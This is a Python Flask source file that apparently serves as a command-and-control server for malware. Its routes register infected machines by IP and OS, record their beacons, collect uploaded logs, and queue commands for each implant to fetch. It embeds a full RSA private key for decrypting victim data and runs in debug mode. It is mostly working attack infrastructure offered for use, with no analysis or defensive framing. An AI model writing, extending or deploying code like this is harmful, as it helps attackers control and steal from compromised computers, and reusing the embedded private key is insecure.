from flask import Flask, request
import uuid
import fileOps


from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

raw_private_key = """-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCRUuI/LMA0M0Hd
7ihYAVJ3KwHGdkbVhzQ5rkp9EIROWYoLqxoHct8Wb4vAzRq5o4H5LT8fqBdK+Ign
UWU/noRzobWBEnuEJMlATiPiav1+r344Xo0yaHq1WO1V67csm0VMt1XQL7J5ZEvz
wpRrOQj1Otu2gV8uzTZ2VgzKe8ni6Af4nZUzbC9tYBXg73Pa0RcRpY/VqHkv5uKX
KmGZWRNN1FtvUzY4JMz5dqGSPERahcAmxsdgExmmLUX73GGZ+gz7A2nbgo4xDomN
oHuxX0uE58Zbp6jK/HA/3IAow0oBbEakun+b0VgAAn6QgsXThPckD3I417nKSXfu
hMqYV4OLAgMBAAECggEAR0hbHvbh/pjn5abk1ior27VWRRWOMD4GIYb7FbaM12u3
OXr/pQi1IemsKPHSep2X6vRFQs9uQYGAM50K53ZnbNq0z6+Ts6FhsC/EDVNCraoC
ZT8HzmKOUjbhD+Sz8GbnSrahGqHSzxWh5dsbdy6+VJ++1xpFaI0Tel9CHe4zfJ9r
xQIH9+2Di+/4NLXQnpjgwIQRyAGkN1qjhmQguzdrjeE6ft1cnml8e9oBvfreFi67
lwncrOdfQ1IORvG7yMQ0ACYniHhO1ltdBA2CzRTHa+r7ZVFTwwWkrGt8gD7YP9pv
TlWeY1bI3yIUhBj/gpakLHqPf8k4VfvEO8SDynPqBQKBgQDF2HbK2TSgTgG4u8oW
t5NWr2ZtVobicP6nY4N+NdbmnDZK76Q/ZRy/icrYynus/1GGIXOtXDMS3bAn+v0B
VZHcZQqb/k1Zw9tvzXZTWH1M9AMGL40/F1aTSc9YKU+GRendTEPbW4PC1f4egCUS
uurUs1A2KEMVCLFt40WGKEyU/QKBgQC8Cj7TGMHBLYH7zyzlC06LOFLwDg+8ntCz
MC68wTv0MrRGmCgT68Lq9p0C3MuLaBUebtR5wjkpPWgsHF7e2w2sjjK/2euPOsLL
tmvLVhZCVIbViTwqbbqQE51hbt0G1vNIEFOIVdfS+Eb2El5lQn9AYuiS1Cre762Y
RcPnVQllJwKBgGqVRNnezdUWcSL+N86pMvzeHUYF+UCAMxAmMi6J/q3Ztf4Ev+1P
IX+mUdscqif2nAqwdssMAo/FUiMXublASgX7gQ2soCsdsle2zmn0H/yW8BIjB+rX
PdK3TrZl+uuROn33mg7QbFlIQ1BXJKHEhMH1n96tLgZk2oEikM/HYgpZAoGAfJt5
eF/ufXoPqfNnN7zfZqiDZWqcCQ1hFW03e4O9nBxBlIpd/J1+BEA6WdxA0fe+DvW4
vZr0UBzOPHTsdVfJ3vA4NyRM0hRJY79V/V/lzjy/QR/5C9C9EZ696wQRWef1PWr8
P9tK8xXtyEDx5r5DH0KsBiis5CEF82M/57tVR38CgYAyEqokcmQeXsB5eZO56d/T
yzmQ/jXh4iAwoEZWrBF7tud779v1sScmnanD2kWOJ7KtExOp+BPLS5LFgbbcXgEz
POgX3wE7IcyuUW/85VkBfh11WhBR0e/g//ev5IZ9422EZh5ALj2TzN1S0lB8CPOF
/iZ+dPSqrA7tSb12XI6Lew==
-----END PRIVATE KEY-----"""

private_key = serialization.load_pem_private_key(
    raw_private_key,
    password=None,
)

app = Flask(__name__)

@app.route("/clients")
def all_clients():
    return fileOps.get_malwares()

@app.route("/logs")
def get_log():
    
    return "this is a log"

@app.route("/upload", methods=['POST'])
def connect():
    fileOps.add_log(request.get_json())
    return "this is a log"

@app.route("/register", methods=['POST'])
def registry():

    malwareRegistry = str(uuid.uuid1().int)
    form_data = request.form.to_dict()

    malware_entry = {
        "id": malwareRegistry,
        "ip": request.remote_addr,
        "os_signature": form_data['OS']
    }
    
    fileOps.add_malware(malware_entry)

    return malwareRegistry
    

@app.route("/becon")
def becon():
    form_data = request.form.to_dict()

    fileOps.update_becon(form_data["id"],form_data["timestamp"])
    return "you are now beconning"

@app.route("/command", methods=['POST', 'GET'])
def command():
    if request.method == 'GET':
        form_data = request.form.to_dict()

        cmd = fileOps.get_command(form_data["id"])
        print(cmd)

        if not cmd:
            return "none"
        else:
            return cmd[0]
    else:
        fileOps.post_command(request.get_json())

        return "post succsesful"
    

if __name__ == "__main__":
    app.run(debug=True)



def decrypt_message(encrypted_data: bytes) -> bytes:
    plaintext = private_key.decrypt(
        encrypted_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext